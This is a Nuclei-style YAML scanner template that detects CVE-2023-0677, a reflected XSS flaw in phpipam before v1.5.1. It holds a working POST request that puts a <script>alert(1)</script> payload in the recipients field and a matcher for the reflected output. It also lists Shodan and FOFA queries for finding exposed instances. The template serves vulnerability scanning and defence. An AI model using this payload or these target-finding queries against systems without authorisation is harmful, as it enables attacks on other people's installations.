id: CVE-2023-0677

info:
  name: Reflected XSS in phpipam
  author: ProjectDiscoveryAI
  severity: medium
  description: Reflected Cross-site Scripting (XSS) vulnerability in phpipam/phpipam prior to v1.5.1.
  impact: |
    Allows attackers to execute malicious scripts in the context of the victim's browser.
  remediation: |
    Implement proper input validation and output encoding to prevent XSS attacks.
  reference:
    - https://github.com/punggawacybersecurity/CVE-List
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-0677
    cwe-id: CWE-79
    epss-score: 0.00068
    epss-percentile: 0.31724
    cpe: cpe:2.3:a:phpipam:phpipam:*:*:*:*:*:*:*:*
  metadata:
    vendor: phpipam
    product: phpipam
    shodan-query: html:"phpIPAM IP address management"
    fofa-query:
      - body="phpipam installation wizard"
      - body="phpipam ip address management"

http:
  - method: POST
    path:
      - "{{BaseURL}}/phpipam/app/subnets/mail-notify-subnet-check.php"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      Referer: "{{BaseURL}}/phpipam/index.php?page=subnets&section=1&subnetId=3"

    body: |
      recipients=%3Cscript%3Ealert(1)%3C%2Fscript%3E&subject=Subnet+details+10.10.1.0%2F24&content=%E2%80%A2+Subnet%3A+%09%09+10.10.1.0%2F24%0D%0A%E2%80%A2+Description%3A+%09%09+Customer+1&csrf_cookie=JgdkDHJcdNgm9oIwbzai9zXWvMahk4vZ
    matchers:
      - type: word
        words:
          - "<div class='alert alert-danger'>Invalid email address - <script>alert(1)</script></div>"
        part: body
